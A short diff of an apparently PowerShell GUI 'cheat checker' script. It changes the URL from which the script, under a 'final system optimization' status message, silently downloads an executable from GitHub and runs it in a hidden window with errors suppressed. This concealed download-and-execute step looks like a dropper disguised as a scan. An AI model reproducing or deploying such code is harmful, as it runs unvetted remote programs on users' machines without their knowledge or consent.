@@ -184,7 +184,7 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/CheatCheckModules.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/CrackOnion/cheat-checker/raw/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
     Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
@@ -204,6 +204,7 @@ $btn.Add_Click($scan)
 # Запуск
 
 [void]$form.ShowDialog()
+
 
 
 
